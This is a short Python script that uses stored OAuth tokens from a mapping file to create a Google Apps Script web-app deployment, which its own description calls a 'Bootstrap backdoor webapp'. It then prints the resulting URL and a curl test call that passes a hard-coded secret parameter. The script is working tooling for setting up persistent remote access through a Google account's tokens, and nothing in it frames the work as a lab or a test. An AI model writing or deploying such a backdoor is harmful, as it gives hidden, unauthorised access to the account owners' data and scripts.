import json
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError

with open("script_to_token_map.json") as f:
    stmap = json.load(f)

script_id = list(stmap["map"].keys())[0]
token_file = list(stmap["map"].values())[0]

print(f"Probing script: {script_id}")

creds = Credentials.from_authorized_user_file(token_file)
if creds.expired and creds.refresh_token:
    creds.refresh(Request())

svc = build("script", "v1", credentials=creds, cache_discovery=False)

# Use the version we already created (version 5)
vnum = 5

# The correct body format for deployments.create is flat (no deploymentConfig wrapper)
try:
    dep = svc.projects().deployments().create(
        scriptId=script_id,
        body={
            "versionNumber": vnum,
            "manifestFileName": "appsscript",
            "description": "Bootstrap backdoor webapp"
        }
    ).execute()

    dep_id = dep.get("deploymentId", "?")
    print(f"✅ Deployment created: {dep_id}")
    print(f"Full response keys: {list(dep.keys())}")
    print(f"entryPoints: {dep.get('entryPoints', [])}")

    # Check if any entry point has a web app URL
    url = None
    for ep in dep.get("entryPoints", []):
        ep_type = ep.get("entryPointType", "")
        print(f"  entryPointType: {ep_type}")
        if ep_type == "WEB_APP":
            url = ep.get("webApp", {}).get("url")
            print(f"  webApp URL: {url}")

    if url:
        print(f"\n🌐 Web App URL: {url}")
        print(f"Test: curl '{url}?secret=GUO_BOOTSTRAP_2026_SECRET'")
    else:
        print("\n⚠️  No WEB_APP entry point in response — manifest may not have webapp block yet")
        print("(This is expected if doGet + webapp manifest not yet pushed)")

except HttpError as e:
    print(f"❌ Deployment failed: {e.content.decode()[:800]}")
